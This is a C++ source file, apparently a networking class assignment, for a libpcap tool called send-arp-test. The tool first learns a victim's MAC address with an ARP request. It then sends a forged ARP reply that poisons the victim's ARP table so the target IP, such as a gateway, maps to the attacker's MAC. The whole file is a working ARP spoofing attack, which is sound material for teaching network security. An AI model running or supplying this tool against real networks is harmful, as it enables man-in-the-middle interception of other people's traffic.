#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <fstream>
#include <unistd.h>
#include <string.h>
#include <iostream>
#include <sys/ioctl.h>
#include <net/if.h>
//호스트 디바이스의 IP주소를 받아오기 위해 불가피하게 include가 늘었습니다.
//main(Anonymous).cpp 에는 간소화되어 있습니다.
using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface> <sender ip> <target ip>\n");
	printf("sample: send-arp-test wlan0 192.168.0.5 192.168.0.1\n");
}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		//if no argument, or not fair of argument
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	ifstream iface("/sys/class/net/" + string(dev) + "/address");
  	string MY_MAC((istreambuf_iterator<char>(iface)), istreambuf_iterator<char>());
	
	char MY_IP[15];
	int fd;
	struct ifreq ifr;
	fd = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family = AF_INET;
	memcpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
	ioctl(fd, SIOCGIFADDR, &ifr);
	close(fd);
	strcpy(MY_IP, inet_ntoa(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr));
	
	cout << "System IP Address is : " << MY_IP << endl;
	cout << "System MAC Address is : " << MY_MAC;
	cout << "Sender IP Address is : " << argv[2] << endl;

	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	EthArpPacket packet;
	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.smac_ = Mac(MY_MAC);
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(MY_MAC);
	packet.arp_.sip_ = htonl(Ip(string(MY_IP)));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip(argv[2]));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "ARP Request::pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	while (true) {
		struct pcap_pkthdr* header;
		const u_char* tmp_packet;
		int res = pcap_next_ex(handle, &header, &tmp_packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		struct EthArpPacket *eth_arp_packet = (struct EthArpPacket *)tmp_packet;
		if(eth_arp_packet->eth_.type() == EthHdr::Arp){ //is arp packet?
			if(eth_arp_packet->arp_.op() == ArpHdr::Reply){ //is arp reply?
				if(eth_arp_packet->arp_.sip() == Ip(argv[2]) && eth_arp_packet->arp_.tmac() == Mac(MY_MAC)){
				//Was it sent by the sender I wanted
					cout << "Sender MAC Address is : " << string(eth_arp_packet->arp_.smac()) << endl;
					packet.eth_.dmac_ = eth_arp_packet->arp_.smac();
					packet.eth_.smac_ = Mac(MY_MAC);
					packet.eth_.type_ = htons(EthHdr::Arp);
					packet.arp_.hrd_ = htons(ArpHdr::ETHER);
					packet.arp_.pro_ = htons(EthHdr::Ip4);
					packet.arp_.hln_ = Mac::SIZE;
					packet.arp_.pln_ = Ip::SIZE;
					packet.arp_.op_ = htons(ArpHdr::Reply);
					packet.arp_.smac_ = Mac(MY_MAC);
					packet.arp_.sip_ = htonl(Ip(string(argv[3])));
					packet.arp_.tmac_ = eth_arp_packet->arp_.smac();
					packet.arp_.tip_ = htonl(Ip(argv[2]));

					int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
					if (res != 0) {
						fprintf(stderr, "ARP Table Infection::pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
					}
					printf("ARP Table Infection Complete!\n");
					break;
				}
			}
		}
	}

	pcap_close(handle);
	
}